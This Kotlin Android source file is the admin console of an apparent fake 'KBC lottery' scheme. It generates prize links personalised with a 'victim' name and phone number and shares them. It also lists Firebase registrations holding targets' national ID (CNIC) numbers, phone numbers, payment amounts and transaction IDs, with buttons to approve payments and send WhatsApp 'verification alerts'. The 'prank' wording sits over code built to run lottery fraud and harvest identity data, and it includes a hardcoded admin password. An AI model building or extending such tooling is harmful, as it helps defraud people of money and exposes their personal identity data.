package com.example.kbclottery

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import org.json.JSONArray
import org.json.JSONObject

// Safe Firebase Core Realtime Data Binding Components
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener

// Base Data Structures (Strictly Preserved)
data class LocalPrankModel(
    val id: Long,
    val victimName: String,
    val victimNumber: String,
    val generatedLink: String
)

data class OnlineRegistryModel(
    val key: String = "",
    val name: String = "",
    val phone: String = "",
    val cnic: String = "",
    val amountPaid: Long = 0,
    val paymentStatus: String = "Pending",
    val paymentMethod: String = "",
    val tid: String = ""
)

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        
        setContent {
            MaterialTheme {
                var isAuthenticated by remember { mutableStateOf(false) }
                
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    if (!isAuthenticated) {
                        LoginScreen(onLoginSuccess = { isAuthenticated = true })
                    } else {
                        KbcPrankApp()
                    }
                }
            }
        }
    }
}

@Composable
fun LoginScreen(onLoginSuccess: () -> Unit) {
    var username by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }
    val context = LocalContext.current

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFFF5F7FB)),
        contentAlignment = Alignment.Center
    ) {
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(24.dp),
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = Color.White),
            elevation = CardDefaults.cardElevation(defaultElevation = 4.dp)
        ) {
            Column(
                modifier = Modifier.padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text(
                    text = "Admin Access",
                    fontSize = 22.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color(0xFF1F2937)
                )
                Spacer(modifier = Modifier.height(24.dp))
                
                OutlinedTextField(
                    value = username,
                    onValueChange = { username = it },
                    label = { Text("ID") },
                    leadingIcon = { Icon(Icons.Default.Person, contentDescription = null) },
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true,
                    shape = RoundedCornerShape(12.dp)
                )
                
                Spacer(modifier = Modifier.height(16.dp))

                OutlinedTextField(
                    value = password,
                    onValueChange = { password = it },
                    label = { Text("Password") },
                    leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                    modifier = Modifier.fillMaxWidth(),
                    visualTransformation = PasswordVisualTransformation(),
                    singleLine = true,
                    shape = RoundedCornerShape(12.dp)
                )

                Spacer(modifier = Modifier.height(24.dp))

                Button(
                    onClick = {
                        if (username.trim() == "jani681" && password == "kbc5800/") {
                            onLoginSuccess()
                        } else {
                            Toast.makeText(context, "Invalid ID or Password", Toast.LENGTH_SHORT).show()
                        }
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(50.dp),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1E3A8A))
                ) {
                    Text("Login", fontSize = 16.sp, fontWeight = FontWeight.Bold)
                }
            }
        }
    }
}

@Composable
fun KbcPrankApp() {
    val context = LocalContext.current
    val sharedPreferences = remember { context.getSharedPreferences("kbc_prank_prefs", Context.MODE_PRIVATE) }
    
    var victimName by remember { mutableStateOf("") }
    var victimNumber by remember { mutableStateOf("") }
    var generatedLink by remember { mutableStateOf("") }
    var showSuccessDialog by remember { mutableStateOf(false) }
    
    var currentPanel by remember { mutableStateOf("generator") } 
    
    val historyList = remember { mutableStateListOf<LocalPrankModel>() }
    val onlineRegistrations = remember { mutableStateListOf<OnlineRegistryModel>() }
    var pendingNotificationsCount by remember { mutableStateOf(0) }

    // Sync Local Persistent Store History Data
    LaunchedEffect(Unit) {
        val savedJson = sharedPreferences.getString("prank_list_json", "[]") ?: "[]"
        try {
            val jsonArray = JSONArray(savedJson)
            for (i in 0 until jsonArray.length()) {
                val obj = jsonArray.getJSONObject(i)
                historyList.add(
                    LocalPrankModel(
                        id = obj.getLong("id"),
                        victimName = obj.getString("name"),
                        victimNumber = obj.getString("num"),
                        generatedLink = obj.getString("link")
                    )
                )
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    // Live Realtime Synchronization Hook
    LaunchedEffect(Unit) {
        try {
            val databaseRef = FirebaseDatabase.getInstance().getReference("registrations")
            databaseRef.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    onlineRegistrations.clear()
                    var pendingCount = 0
                    for (childSnapshot in snapshot.children) {
                        val key = childSnapshot.key ?: ""
                        val name = childSnapshot.child("name").getValue(String::class.java) ?: "Unknown"
                        val phone = childSnapshot.child("phone").getValue(String::class.java) ?: ""
                        val cnic = childSnapshot.child("cnic").getValue(String::class.java) ?: ""
                        val amountPaid = childSnapshot.child("amountPaid").getValue(Long::class.java) ?: 0L
                        val paymentStatus = childSnapshot.child("paymentStatus").getValue(String::class.java) ?: "Pending"
                        val paymentMethod = childSnapshot.child("paymentMethod").getValue(String::class.java) ?: ""
                        val tid = childSnapshot.child("tid").getValue(String::class.java) ?: ""

                        if (paymentStatus.lowercase() == "pending" || paymentStatus.lowercase() == "unverified") {
                            pendingCount++
                        }

                        onlineRegistrations.add(
                            0,
                            OnlineRegistryModel(key, name, phone, cnic, amountPaid, paymentStatus, paymentMethod, tid)
                        )
                    }
                    pendingNotificationsCount = pendingCount
                }

                override fun onCancelled(error: DatabaseError) {
                    Toast.makeText(context, "Database Connection Interrupted", Toast.LENGTH_SHORT).show()
                }
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFFF5F7FB))
            .statusBarsPadding()
            .navigationBarsPadding()
    ) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            // Main Dashboard App Bar Configuration
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(bottom = 16.dp),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1E3A8A))
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text(
                            text = "KBC Control Center",
                            color = Color.White,
                            fontSize = 20.sp,
                            fontWeight = FontWeight.Bold
                        )
                        Text(
                            text = if (currentPanel == "generator") "Link Generator Active" else "Live Verification Active",
                            color = Color(0xFF93C5FD),
                            fontSize = 13.sp
                        )
                    }
                    
                    Box(contentAlignment = Alignment.TopEnd) {
                        IconButton(onClick = { currentPanel = "registry" }) {
                            Icon(Icons.Default.Notifications, contentDescription = "Alerts", tint = Color.White)
                        }
                        if (pendingNotificationsCount > 0) {
                            Box(
                                modifier = Modifier
                                    .padding(top = 4.dp, end = 4.dp)
                                    .size(18.dp)
                                    .background(Color(0xFFDC2626), shape = RoundedCornerShape(9.dp)),
                                contentAlignment = Alignment.Center
                            ) {
                                Text(
                                    text = pendingNotificationsCount.toString(),
                                    color = Color.White,
                                    fontSize = 10.sp,
                                    fontWeight = FontWeight.Bold
                                )
                            }
                        }
                    }
                }
            }

            // Tab Navigation System
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(bottom = 16.dp),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                Button(
                    onClick = { currentPanel = "generator" },
                    modifier = Modifier.weight(1f),
                    shape = RoundedCornerShape(10.dp),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = if (currentPanel == "generator") Color(0xFF2563EB) else Color.LightGray
                    )
                ) {
                    Icon(Icons.Default.Build, contentDescription = null, modifier = Modifier.size(18.dp))
                    Spacer(modifier = Modifier.width(6.dp))
                    Text("Generator", fontSize = 14.sp)
                }

                Button(
                    onClick = { currentPanel = "registry" },
                    modifier = Modifier.weight(1f),
                    shape = RoundedCornerShape(10.dp),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = if (currentPanel == "registry") Color(0xFF0F172A) else Color.LightGray
                    )
                ) {
                    Icon(Icons.Default.List, contentDescription = null, modifier = Modifier.size(18.dp))
                    Spacer(modifier = Modifier.width(6.dp))
                    Text("Dashboard", fontSize = 14.sp)
                }
            }

            // Interface Rendering Router Switch
            if (currentPanel == "generator") {
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(bottom = 16.dp),
                    shape = RoundedCornerShape(16.dp),
                    colors = CardDefaults.cardColors(containerColor = Color.White),
                    elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        OutlinedTextField(
                            value = victimName,
                            onValueChange = { victimName = it },
                            label = { Text("Victim Name") },
                            leadingIcon = { Icon(Icons.Default.Person, contentDescription = null) },
                            modifier = Modifier.fillMaxWidth(),
                            singleLine = true,
                            shape = RoundedCornerShape(12.dp)
                        )
                        
                        Spacer(modifier = Modifier.height(16.dp))

                        OutlinedTextField(
                            value = victimNumber,
                            onValueChange = { victimNumber = it },
                            label = { Text("Victim Phone Number") },
                            leadingIcon = { Icon(Icons.Default.Phone, contentDescription = null) },
                            modifier = Modifier.fillMaxWidth(),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Phone),
                            singleLine = true,
                            shape = RoundedCornerShape(12.dp)
                        )

                        Spacer(modifier = Modifier.height(24.dp))

                        Button(
                            onClick = {
                                if (victimName.isBlank() || victimNumber.isBlank()) {
                                    Toast.makeText(context, "Please enter both details", Toast.LENGTH_SHORT).show()
                                } else {
                                    val baseSharedUrl = "https://kbc-lottery.vercel.app/"
                                    val encodedName = Uri.encode(victimName.trim())
                                    val encodedNumber = Uri.encode(victimNumber.trim())
                                    
                                    val finalLink = "${baseSharedUrl}?name=${encodedName}&num=${encodedNumber}"
                                    generatedLink = finalLink
                                    showSuccessDialog = true

                                    val newItem = LocalPrankModel(
                                        id = System.currentTimeMillis(),
                                        victimName = victimName.trim(),
                                        victimNumber = victimNumber.trim(),
                                        generatedLink = finalLink
                                    )
                                    
                                    historyList.add(0, newItem)

                                    val jsonArray = JSONArray()
                                    historyList.forEach {
                                        val obj = JSONObject().apply {
                                            put("id", it.id)
                                            put("name", it.victimName)
                                            put("num", it.victimNumber)
                                            put("link", it.generatedLink)
                                        }
                                        jsonArray.put(obj)
                                    }
                                    sharedPreferences.edit().putString("prank_list_json", jsonArray.toString()).apply()
                                }
                            },
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(50.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2563EB))
                        ) {
                            Icon(Icons.Default.Build, contentDescription = null)
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("Generate Prize Link", fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                        }

                        Spacer(modifier = Modifier.height(12.dp))

                        Button(
                            onClick = {
                                val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://kbc-lottery.vercel.app/generator.html"))
                                context.startActivity(intent)
                            },
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(50.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFDC2626))
                        ) {
                            Icon(Icons.Default.AccountBox, contentDescription = null)
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("Create Registration Certificate", fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                        }

                        Spacer(modifier = Modifier.height(12.dp))

                        Button(
                            onClick = {
                                val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://kbc-lottery.vercel.app/registry.html"))
                                context.startActivity(intent)
                            },
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(50.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0F172A))
                        ) {
                            Icon(Icons.Default.List, contentDescription = null)
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("صارف پروفائل رجسٹری (Registry)", fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                        }
                    }
                }

                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 4.dp, vertical = 8.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Icon(Icons.Default.Refresh, contentDescription = null, tint = Color.Gray)
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = "Generated Links History",
                        fontSize = 16.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color.DarkGray
                    )
                }

                if (historyList.isEmpty()) {
                    Box(modifier = Modifier.fillMaxWidth().weight(1f), contentAlignment = Alignment.Center) {
                        Text("No history yet. Generated links will appear here.", color = Color.Gray, fontSize = 14.sp)
                    }
                } else {
                    LazyColumn(modifier = Modifier.fillMaxWidth().weight(1f), verticalArrangement = Arrangement.spacedBy(10.dp)) {
                        items(historyList, key = { it.id }) { prank ->
                            HistoryItemRow(prank = prank, context = context)
                        }
                    }
                }
            } else if (currentPanel == "registry") {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 4.dp, vertical = 4.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Icon(Icons.Default.CheckCircle, contentDescription = null, tint = Color(0xFF1E3A8A))
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = "Live Registration Submissions",
                        fontSize = 16.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color.DarkGray
                    )
                }

                if (onlineRegistrations.isEmpty()) {
                    Box(modifier = Modifier.fillMaxWidth().weight(1f), contentAlignment = Alignment.Center) {
                        Text("No entries found in Firebase database.", color = Color.Gray, fontSize = 14.sp)
                    }
                } else {
                    LazyColumn(
                        modifier = Modifier.fillMaxWidth().weight(1f),
                        verticalArrangement = Arrangement.spacedBy(12.dp)
                    ) {
                        items(onlineRegistrations, key = { it.key }) { registry ->
                            OnlineRegistryItemCard(registry = registry, context = context)
                        }
                    }
                }
            }
        }

        // Overlay Feedback Component System
        if (showSuccessDialog) {
            Dialog(
                onDismissRequest = { showSuccessDialog = false },
                properties = DialogProperties(dismissOnBackPress = true, dismissOnClickOutside = true)
            ) {
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    shape = RoundedCornerShape(20.dp),
                    colors = CardDefaults.cardColors(containerColor = Color.White),
                    elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
                ) {
                    Column(
                        modifier = Modifier.padding(24.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        Icon(Icons.Default.CheckCircle, contentDescription = null, tint = Color(0xFF10B981), modifier = Modifier.size(54.dp))
                        Spacer(modifier = Modifier.height(16.dp))
                        Text("Link Generated Successfully!", fontWeight = FontWeight.Bold, fontSize = 18.sp, color = Color(0xFF1F2937))
                        Spacer(modifier = Modifier.height(12.dp))
                        
                        OutlinedTextField(
                            value = generatedLink,
                            onValueChange = {},
                            readOnly = true,
                            modifier = Modifier.fillMaxWidth(),
                            textStyle = androidx.compose.ui.text.TextStyle(fontSize = 13.sp),
                            shape = RoundedCornerShape(8.dp)
                        )
                        
                        Spacer(modifier = Modifier.height(20.dp))
                        
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(12.dp)
                        ) {
                            OutlinedButton(
                                onClick = {
                                    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                                    val clip = ClipData.newPlainText("KBC Link", generatedLink)
                                    clipboard.setPrimaryClip(clip)
                                    Toast.makeText(context, "Link copied to clipboard", Toast.LENGTH_SHORT).show()
                                },
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(10.dp)
                            ) {
                                Icon(Icons.Default.Share, contentDescription = null, modifier = Modifier.size(18.dp))
                                Spacer(modifier = Modifier.width(6.dp))
                                Text("Copy")
                            }

                            Button(
                                onClick = {
                                    val intent = Intent(Intent.ACTION_SEND).apply {
                                        type = "text/plain"
                                        putExtra(Intent.EXTRA_TEXT, generatedLink)
                                    }
                                    context.startActivity(Intent.createChooser(intent, "Share via"))
                                },
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(10.dp),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF10B981))
                            ) {
                                Icon(Icons.Default.Send, contentDescription = null, modifier = Modifier.size(18.dp))
                                Spacer(modifier = Modifier.width(6.dp))
                                Text("Share")
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun HistoryItemRow(prank: LocalPrankModel, context: Context) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(12.dp),
        colors = CardDefaults.cardColors(containerColor = Color.White),
        elevation = CardDefaults.cardElevation(defaultElevation = 1.dp)
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(12.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Column(modifier = Modifier.weight(1f)) {
                Text(text = prank.victimName, fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFF1F2937))
                Text(text = prank.victimNumber, fontSize = 13.sp, color = Color.Gray)
                Spacer(modifier = Modifier.height(4.dp))
                Text(text = prank.generatedLink, fontSize = 11.sp, color = Color(0xFF2563EB), maxLines = 1, overflow = TextOverflow.Ellipsis)
            }
            
            Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                IconButton(onClick = {
                    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val clip = ClipData.newPlainText("KBC Link", prank.generatedLink)
                    clipboard.setPrimaryClip(clip)
                    Toast.makeText(context, "Copied!", Toast.LENGTH_SHORT).show()
                }) {
                    Icon(Icons.Default.Share, contentDescription = "Copy", tint = Color(0xFF4B5563))
                }

                IconButton(onClick = {
                    val intent = Intent(Intent.ACTION_SEND).apply {
                        type = "text/plain"
                        putExtra(Intent.EXTRA_TEXT, prank.generatedLink)
                    }
                    context.startActivity(Intent.createChooser(intent, "Share via"))
                }) {
                    Icon(Icons.Default.Send, contentDescription = "Share", tint = Color(0xFF10B981))
                }
            }
        }
    }
}

@Composable
fun OnlineRegistryItemCard(registry: OnlineRegistryModel, context: Context) {
    val databaseRef = FirebaseDatabase.getInstance().getReference("registrations").child(registry.key)
    
    val statusColor = when (registry.paymentStatus.lowercase()) {
        "paid" -> Color(0xFF10B981)   
        "rejected" -> Color(0xFFEF4444) 
        else -> Color(0xFFF59E0B)       
    }

    Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(14.dp),
        colors = CardDefaults.cardColors(containerColor = Color.White),
        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
    ) {
        Column(modifier = Modifier.padding(14.dp)) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(
                    text = registry.name,
                    fontWeight = FontWeight.Bold,
                    fontSize = 16.sp,
                    color = Color(0xFF1F2937),
                    modifier = Modifier.weight(1f)
                )
                
                Surface(
                    color = statusColor.copy(alpha = 0.15f),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Text(
                        text = registry.paymentStatus.uppercase(),
                        color = statusColor,
                        fontWeight = FontWeight.Bold,
                        fontSize = 11.sp,
                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
                    )
                }
            }

            Spacer(modifier = Modifier.height(6.dp))

            Text(text = "Phone: ${registry.phone}", fontSize = 13.sp, color = Color.Gray)
            if (registry.cnic.isNotBlank()) {
                Text(text = "CNIC: ${registry.cnic}", fontSize = 13.sp, color = Color.Gray)
            }
            
            Spacer(modifier = Modifier.height(6.dp))
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(1.dp)
                    .background(Color(0xFFE5E7EB))
            )
            Spacer(modifier = Modifier.height(6.dp))
            
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Text(
                    text = "TID: ${if(registry.tid.isBlank()) "Not Provided" else registry.tid}",
                    fontSize = 12.sp,
                    fontWeight = FontWeight.SemiBold,
                    color = Color(0xFF1F2937)
                )
                Text(
                    text = "Rs. ${registry.amountPaid} (${registry.paymentMethod})",
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color(0xFF1E3A8A)
                )
            }

            Spacer(modifier = Modifier.height(12.dp))

            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                OutlinedButton(
                    onClick = {
                        if (registry.phone.isNotBlank()) {
                            val cleanNumber = registry.phone.replace("+", "").replace(" ", "")
                            val finalTarget = if (!cleanNumber.startsWith("92")) "92${cleanNumber.removePrefix("0")}" else cleanNumber
                            val url = "https://wa.me/$finalTarget?text=Assalam-o-Alaikum ${Uri.encode(registry.name)}, KBC system verification alert."
                            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                            context.startActivity(intent)
                        } else {
                            Toast.makeText(context, "Phone number missing", Toast.LENGTH_SHORT).show()
                        }
                    },
                    modifier = Modifier.weight(1.1f),
                    shape = RoundedCornerShape(8.dp),
                    contentPadding = PaddingValues(horizontal = 4.dp)
                ) {
                    Icon(Icons.Default.Share, contentDescription = null, modifier = Modifier.size(16.dp), tint = Color(0xFF2563EB))
                    Spacer(modifier = Modifier.width(4.dp))
                    Text("WhatsApp", fontSize = 11.sp, color = Color(0xFF2563EB))
                }

                Button(
                    onClick = {
                        databaseRef.child("paymentStatus").setValue("Rejected")
                            .addOnSuccessListener { Toast.makeText(context, "Marked as Rejected", Toast.LENGTH_SHORT).show() }
                    },
                    modifier = Modifier.weight(0.9f),
                    shape = RoundedCornerShape(8.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFEF4444)),
                    contentPadding = PaddingValues(horizontal = 4.dp)
                ) {
                    Icon(Icons.Default.Clear, contentDescription = null, modifier = Modifier.size(16.dp))
                    Spacer(modifier = Modifier.width(4.dp))
                    Text("Reject", fontSize = 11.sp)
                }

                Button(
                    onClick = {
                        databaseRef.child("paymentStatus").setValue("Paid")
                            .addOnSuccessListener { Toast.makeText(context, "Marked as Paid!", Toast.LENGTH_SHORT).show() }
                    },
                    modifier = Modifier.weight(1f),
                    shape = RoundedCornerShape(8.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF10B981)),
                    contentPadding = PaddingValues(horizontal = 4.dp)
                ) {
                    Icon(Icons.Default.Check, contentDescription = null, modifier = Modifier.size(16.dp))
                    Spacer(modifier = Modifier.width(4.dp))
                    Text("Approve", fontSize = 11.sp)
                }
            }
        }
    }
}
